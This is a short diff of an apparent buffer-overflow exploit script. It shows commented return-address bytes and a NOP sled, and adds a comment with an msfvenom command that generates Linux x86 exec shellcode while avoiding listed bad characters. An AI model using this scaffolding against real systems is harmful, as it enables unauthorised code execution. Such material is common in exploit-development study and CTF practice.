@@ -17,6 +17,7 @@ find \b \0x<begining of heap>, \0x<end of stack>, \0xff, \0xe4
 #offset += '\x59\x3b\xde\xf7'
 #offset += "\x90" * 15
 
+#  msfvenom -p linux/x86/exec CMD=<command you want to run> -b "\x00\xfe\x20\x0a\xff" -f python
 # shelcode goes below
 
 
